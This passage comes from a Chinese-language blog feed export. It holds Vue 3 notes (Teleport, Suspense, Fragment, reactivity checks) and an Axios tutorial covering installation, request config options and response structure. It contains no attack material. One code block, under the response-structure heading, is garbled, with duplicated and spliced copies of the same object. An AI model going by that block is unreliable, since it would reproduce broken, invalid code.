&#123;&#123;color&#125;&#125;&lt;/h3&gt;</span><br><span class="line">  </span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; inject &#125; from &#x27;vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">  setup() &#123;</span><br><span class="line">    const color = inject(&#x27;color&#x27;)</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">      color</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="响应式数据的判断"><a href="#响应式数据的判断" class="headerlink" title="响应式数据的判断"></a>响应式数据的判断</h1><ul><li>isRef: 检查一个值是否为一个 ref 对象</li><li>isReactive: 检查一个对象是否是由 <code>reactive</code> 创建的响应式代理</li><li>isReadonly: 检查一个对象是否是由 <code>readonly</code> 创建的只读代理</li><li>isProxy: 检查一个对象是否是由 <code>reactive</code> 或者 <code>readonly</code> 方法创建的代理</li></ul><h1 id="新增组件"><a href="#新增组件" class="headerlink" title="新增组件"></a>新增组件</h1><h2 id="Fragment-片断"><a href="#Fragment-片断" class="headerlink" title="Fragment(片断)"></a>Fragment(片断)</h2><ul><li>在Vue2中: 组件必须有一个根标签</li><li>在Vue3中: 组件可以没有根标签, 内部会将多个标签包含在一个Fragment虚拟元素中</li><li>好处: 减少标签层级, 减小内存占用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;h2&gt;aaaa&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;aaaa&lt;/h2&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><h2 id="Teleport-瞬移"><a href="#Teleport-瞬移" class="headerlink" title="Teleport(瞬移)"></a>Teleport(瞬移)</h2><ul><li>Teleport 提供了一种干净的方法, 让组件的html在父组件界面外的特定标签(很可能是body)下插入显示</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;button @click=&quot;modalOpen = true&quot;&gt;</span><br><span class="line">      Open full screen modal! (With teleport!)</span><br><span class="line">  &lt;/button&gt;</span><br><span class="line"></span><br><span class="line">  &lt;teleport to=&quot;body&quot;&gt;</span><br><span class="line">    &lt;div v-if=&quot;modalOpen&quot; class=&quot;modal&quot;&gt;</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        I&#x27;m a teleported modal! </span><br><span class="line">        (My parent is &quot;body&quot;)</span><br><span class="line">        &lt;button @click=&quot;modalOpen = false&quot;&gt;</span><br><span class="line">          Close</span><br><span class="line">        &lt;/button&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/teleport&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import &#123; ref &#125; from &#x27;vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;modal-button&#x27;,</span><br><span class="line">  setup () &#123;</span><br><span class="line">    const modalOpen = ref(false)</span><br><span class="line">    return &#123;</span><br><span class="line">      modalOpen</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">.modal &#123;</span><br><span class="line">  position: absolute;</span><br><span class="line">  top: 0; right: 0; bottom: 0; left: 0;</span><br><span class="line">  background-color: rgba(0,0,0,.5);</span><br><span class="line">  display: flex;</span><br><span class="line">  flex-direction: column;</span><br><span class="line">  align-items: center;</span><br><span class="line">  justify-content: center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.modal div &#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  flex-direction: column;</span><br><span class="line">  align-items: center;</span><br><span class="line">  justify-content: center;</span><br><span class="line">  background-color: white;</span><br><span class="line">  width: 300px;</span><br><span class="line">  height: 300px;</span><br><span class="line">  padding: 5px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h2&gt;App&lt;/h2&gt;</span><br><span class="line">  &lt;modal-button&gt;&lt;/modal-button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import ModalButton from &#x27;./ModalButton.vue&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  setup() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  components: &#123;</span><br><span class="line">    ModalButton</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="Suspense-不确定的"><a href="#Suspense-不确定的" class="headerlink" title="Suspense(不确定的)"></a>Suspense(不确定的)</h2><ul><li>它们允许我们的应用程序在等待异步组件时渲染一些后备内容，可以让我们创建一个平滑的用户体验</li><li>等待加载的时候给与及时的反馈</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;Suspense&gt;</span><br><span class="line">    &lt;template v-slot:default&gt;</span><br><span class="line">      &lt;AsyncComp/&gt;</span><br><span class="line">      &lt;!-- &lt;AsyncAddress/&gt; --&gt;</span><br><span class="line">    &lt;/template&gt;</span><br><span class="line"></span><br><span class="line">    &lt;template v-slot:fallback&gt;</span><br><span class="line">      &lt;h1&gt;LOADING...&lt;/h1&gt;</span><br><span class="line">    &lt;/template&gt;</span><br><span class="line">  &lt;/Suspense&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">/* </span><br><span class="line">异步组件 + Suspense组件</span><br><span class="line">*/</span><br><span class="line">// import AsyncComp from &#x27;./AsyncComp.vue&#x27;</span><br><span class="line">import AsyncAddress from &#x27;./AsyncAddress.vue&#x27;</span><br><span class="line">import &#123; defineAsyncComponent &#125; from &#x27;vue&#x27;</span><br><span class="line">const AsyncComp = defineAsyncComponent(() =&gt; import(&#x27;./AsyncComp.vue&#x27;))</span><br><span class="line">export default &#123;</span><br><span class="line">  setup() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  components: &#123;</span><br><span class="line">    AsyncComp,</span><br><span class="line">    AsyncAddress</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h2&gt;AsyncComp22&lt;/h2&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123;msg&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;AsyncComp&#x27;,</span><br><span class="line">  setup () &#123;</span><br><span class="line">    // return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">    //   setTimeout(() =&gt; &#123;</span><br><span class="line">    //     resolve(&#123;</span><br><span class="line">    //       msg: &#x27;abc&#x27;</span><br><span class="line">    //     &#125;)</span><br><span class="line">    //   &#125;, 2000)</span><br><span class="line">    // &#125;)</span><br><span class="line">    return &#123;</span><br><span class="line">      msg: &#x27;abc&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h2&gt;&#123;&#123;data&#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import axios from &#x27;axios&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">  async setup() &#123;</span><br><span class="line">    const result = await axios.get(&#x27;/data/address.json&#x27;)</span><br><span class="line">    return &#123;</span><br><span class="line">      data: result.data</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Axios基本使用</title>
      <link href="/2022/03/21/Axios%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/03/21/Axios%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Axios基本使用"><a href="#Axios基本使用" class="headerlink" title="Axios基本使用"></a>Axios基本使用</h1><h1 id="axios-是什么"><a href="#axios-是什么" class="headerlink" title="axios 是什么"></a>axios 是什么</h1><p>前端最流行的 ajax 请求库</p><p>react/vue 官方都推荐使用 axios 发 ajax 请求</p><h2 id="axios-特点"><a href="#axios-特点" class="headerlink" title="axios 特点"></a>axios 特点</h2><ol><li>基于 xhr + promise 的异步 ajax 请求库 </li><li> 浏览器端/node 端都可以使用 </li><li> 支持请求／响应拦截器</li><li>持请求取消 </li><li> 请求/响应数据转换 </li><li> 批量发送多个请求</li></ol><h2 id="安装方式"><a href="#安装方式" class="headerlink" title="安装方式"></a>安装方式</h2><p>包管理方式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install axios</span><br></pre></td></tr></table></figure><p>国内cdn方式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/axios/0.26.1/axios.min.js&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha512-bPh3uwgU5qEMipS/VOmRqynnMXGGSRv+72H/N260MQeXZIK4PG48401Bsby9Nq5P5fz7hy5UGNmC/W1Z51h2GQ==&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span> <span class="attr">referrerpolicy</span>=<span class="string">&quot;no-referrer&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="配置对象"><a href="#配置对象" class="headerlink" title="配置对象"></a>配置对象</h1><p>这些是创建请求时可以用的配置选项。只有 <code>url</code> 是必需的。如果没有指定 <code>method</code>，请求将默认使用 <code>get</code> 方法</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="comment">// `url` 是用于请求的服务器 URL</span></span><br><span class="line">  url: &#x27;/user&#x27;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `method` 是创建请求时使用的方法</span></span><br><span class="line">  method: &#x27;get&#x27;, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// `baseURL` 将自动加在 `url` 前面，除非 `url` 是一个绝对 URL。</span></span><br><span class="line">  <span class="comment">// 它可以通过设置一个 `baseURL` 便于为 axios 实例的方法传递相对 URL</span></span><br><span class="line">  baseURL: &#x27;https:<span class="comment">//some-domain.com/api/&#x27;,</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// `transformRequest` 允许在向服务器发送前，修改请求数据</span></span><br><span class="line">  <span class="comment">// 只能用在 &#x27;PUT&#x27;, &#x27;POST&#x27; 和 &#x27;PATCH&#x27; 这几个请求方法</span></span><br><span class="line">  <span class="comment">// 后面数组中的函数必须返回一个字符串，或 ArrayBuffer，或 Stream</span></span><br><span class="line">  transformRequest: [function (data, headers) &#123;</span><br><span class="line">    <span class="comment">// 对 data 进行任意转换处理</span></span><br><span class="line">    return data;</span><br><span class="line">  &#125;],</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `transformResponse` 在传递给 then/catch 前，允许修改响应数据</span></span><br><span class="line">  transformResponse: [function (data) &#123;</span><br><span class="line">    <span class="comment">// 对 data 进行任意转换处理</span></span><br><span class="line">    return data;</span><br><span class="line">  &#125;],</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `headers` 是即将被发送的自定义请求头</span></span><br><span class="line">  headers: &#123;&#x27;X-Requested-With&#x27;: &#x27;XMLHttpRequest&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `params` 是即将与请求一起发送的 URL 参数</span></span><br><span class="line">  <span class="comment">// 必须是一个无格式对象(plain object)或 URLSearchParams 对象</span></span><br><span class="line">  params: &#123;</span><br><span class="line">    ID: <span class="number">12345</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">   <span class="comment">// `paramsSerializer` 是一个负责 `params` 序列化的函数</span></span><br><span class="line">  <span class="comment">// (e.g. https://www.npmjs.com/package/qs, http://api.jquery.com/jquery.param/)</span></span><br><span class="line">  paramsSerializer: function(params) &#123;</span><br><span class="line">    return Qs.stringify(params, &#123;arrayFormat: &#x27;brackets&#x27;&#125;)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `data` 是作为请求主体被发送的数据</span></span><br><span class="line">  <span class="comment">// 只适用于这些请求方法 &#x27;PUT&#x27;, &#x27;POST&#x27;, 和 &#x27;PATCH&#x27;</span></span><br><span class="line">  <span class="comment">// 在没有设置 `transformRequest` 时，必须是以下类型之一：</span></span><br><span class="line">  <span class="comment">// - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams</span></span><br><span class="line">  <span class="comment">// - 浏览器专属：FormData, File, Blob</span></span><br><span class="line">  <span class="comment">// - Node 专属： Stream</span></span><br><span class="line">  data: &#123;</span><br><span class="line">    firstName: &#x27;Fred&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `timeout` 指定请求超时的毫秒数(0 表示无超时时间)</span></span><br><span class="line">  <span class="comment">// 如果请求话费了超过 `timeout` 的时间，请求将被中断</span></span><br><span class="line">  timeout: <span class="number">1000</span>,</span><br><span class="line"></span><br><span class="line">   <span class="comment">// `withCredentials` 表示跨域请求时是否需要使用凭证</span></span><br><span class="line">  withCredentials: <span class="literal">false</span>, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// `adapter` 允许自定义处理请求，以使测试更轻松</span></span><br><span class="line">  <span class="comment">// 返回一个 promise 并应用一个有效的响应 (查阅 [response docs](#response-api)).</span></span><br><span class="line">  adapter: function (config) &#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line"> <span class="comment">// `auth` 表示应该使用 HTTP 基础验证，并提供凭据</span></span><br><span class="line">  <span class="comment">// 这将设置一个 `Authorization` 头，覆写掉现有的任意使用 `headers` 设置的自定义 `Authorization`头</span></span><br><span class="line">  auth: &#123;</span><br><span class="line">    username: &#x27;janedoe&#x27;,</span><br><span class="line">    password: &#x27;s00pers3cret&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">   <span class="comment">// `responseType` 表示服务器响应的数据类型，可以是 &#x27;arraybuffer&#x27;, &#x27;blob&#x27;, &#x27;document&#x27;, &#x27;json&#x27;, &#x27;text&#x27;, &#x27;stream&#x27;</span></span><br><span class="line">  responseType: &#x27;json&#x27;, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// `responseEncoding` indicates encoding to use for decoding responses</span></span><br><span class="line">  <span class="comment">// Note: Ignored for `responseType` of &#x27;stream&#x27; or client-side requests</span></span><br><span class="line">  responseEncoding: &#x27;utf8&#x27;, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// `xsrfCookieName` 是用作 xsrf token 的值的cookie的名称</span></span><br><span class="line">  xsrfCookieName: &#x27;XSRF-TOKEN&#x27;, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// `xsrfHeaderName` is the name of the http header that carries the xsrf token value</span></span><br><span class="line">  xsrfHeaderName: &#x27;X-XSRF-TOKEN&#x27;, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// `onUploadProgress` 允许为上传处理进度事件</span></span><br><span class="line">  onUploadProgress: function (progressEvent) &#123;</span><br><span class="line">    <span class="comment">// Do whatever you want with the native progress event</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `onDownloadProgress` 允许为下载处理进度事件</span></span><br><span class="line">  onDownloadProgress: function (progressEvent) &#123;</span><br><span class="line">    <span class="comment">// 对原生进度事件的处理</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">   <span class="comment">// `maxContentLength` 定义允许的响应内容的最大尺寸</span></span><br><span class="line">  maxContentLength: <span class="number">2000</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `validateStatus` 定义对于给定的HTTP 响应状态码是 resolve 或 reject  promise 。如果 `validateStatus` 返回 `true` (或者设置为 `null` 或 `undefined`)，promise 将被 resolve; 否则，promise 将被 rejecte</span></span><br><span class="line">  validateStatus: function (status) &#123;</span><br><span class="line">    return status &gt;= 200 &amp;&amp; status &lt; 300; <span class="comment">// default</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `maxRedirects` 定义在 node.js 中 follow 的最大重定向数目</span></span><br><span class="line">  <span class="comment">// 如果设置为0，将不会 follow 任何重定向</span></span><br><span class="line">  maxRedirects: <span class="number">5</span>, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// `socketPath` defines a UNIX Socket to be used in node.js.</span></span><br><span class="line">  <span class="comment">// e.g. &#x27;/var/run/docker.sock&#x27; to send requests to the docker daemon.</span></span><br><span class="line">  <span class="comment">// Only either `socketPath` or `proxy` can be specified.</span></span><br><span class="line">  <span class="comment">// If both are specified, `socketPath` is used.</span></span><br><span class="line">  socketPath: <span class="literal">null</span>, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// `httpAgent` 和 `httpsAgent` 分别在 node.js 中用于定义在执行 http 和 https 时使用的自定义代理。允许像这样配置选项：</span></span><br><span class="line">  <span class="comment">// `keepAlive` 默认没有启用</span></span><br><span class="line">  httpAgent: new http.Agent(&#123; keepAlive: <span class="literal">true</span> &#125;),</span><br><span class="line">  httpsAgent: new https.Agent(&#123; keepAlive: <span class="literal">true</span> &#125;),</span><br><span class="line"></span><br><span class="line">  <span class="comment">// &#x27;proxy&#x27; 定义代理服务器的主机名称和端口</span></span><br><span class="line">  <span class="comment">// `auth` 表示 HTTP 基础验证应当用于连接代理，并提供凭据</span></span><br><span class="line">  <span class="comment">// 这将会设置一个 `Proxy-Authorization` 头，覆写掉已有的通过使用 `header` 设置的自定义 `Proxy-Authorization` 头。</span></span><br><span class="line">  proxy: &#123;</span><br><span class="line">    host: &#x27;<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>&#x27;,</span><br><span class="line">    port: <span class="number">9000</span>,</span><br><span class="line">    auth: &#123;</span><br><span class="line">      username: &#x27;mikeymike&#x27;,</span><br><span class="line">      password: &#x27;rapunz3l&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `cancelToken` 指定用于取消请求的 cancel token</span></span><br><span class="line">  <span class="comment">// （查看后面的 Cancellation 这节了解更多）</span></span><br><span class="line">  cancelToken: new CancelToken(function (cancel) &#123;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="响应结构"><a href="#响应结构" class="headerlink" title="响应结构"></a>响应结构</h2><p>某个请求的响应包含以下信息</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="comment">// `data` 由服务器提供的响应</span></span><br><span class="line">  data: &#123;&#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `status` 来自服务器响应的 HTTP 状态码</span></span><br><span class="line">  status: <span class="number">200</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `statusText` 来自服务器响应的 HTTP 状态信息</span></span><br><span class="line">  statusText: &#x27;OK&#x27;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// `headers` 服务器响应的头</span></span><br><span class="line">  headers: &#123;&#125;,</span><br><span class="line"></span><br><span class="line">   <span class="comment">// `config` 是为请求提供的配置信息</span></span><br><span class="line">  config: &#123;&#125;,</span><br><span class="line"> <span class="comment">// &#x27;request&#x27;</span></span><br><span class="line">  <span class="comment">// `request` is the request that generated this response</span></span><br><span class="line">  <span class="comment">// It is the last ClientRequest instance in node.js (in redirects)</span></span><br><span class="line">  <span class="comment">// and an XMLHttpRequest instance the browser</span></span><br><span class="line">  request: &#123;&#125;</span><br><span class="line">&#125;xxxxxxxxxx &#123;  <span class="comment">// `data` 由服务器提供的响应  data: &#123;&#125;,  // `status` 来自服务器响应的 HTTP 状态码  status: 200,  // `s&#123;  // `data` 由服务器提供的响应  data: &#123;&#125;,  // `status` 来自服务器响应的 HTTP 状态码  status: 200,  // `statusText` 来自服务器响应的 HTTP 状态信息  statusText: &#x27;OK&#x27;,  // `headers` 服务器响应的头  headers: &#123;&#125;,   // `config` 是为请求提供的配置信息  config: &#123;&#125;, // &#x27;request&#x27;  // `request` is the request that generated this response  // It is the last ClientRequest instance in node.js (in redirects)  // and an XMLHttpRequest instance the browser  request: &#123;&#125;&#125;tatusText` 来自服务器响应的 HTTP 状态信息  statusText: &#x27;OK&#x27;,  // `headers` 服务器响应的头  headers: &#123;&#125;,   // `config` 是为请求提供的配置信息  config: &#123;&#125;, // &#x27;request&#x27;  // `request` is the request that generated this response  // It is the last ClientRequest instance in node.js (in redirects)  // and an XMLHttpRequest instance the browser  request: &#123;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>使用 <code>then</code> 时，你将接收下面这样的响应 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">axios.get(<span class="string">&#x27;/user/12345&#x27;</span>)  .then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;    <span class="built_in">console</span>.log(response.data);    <span 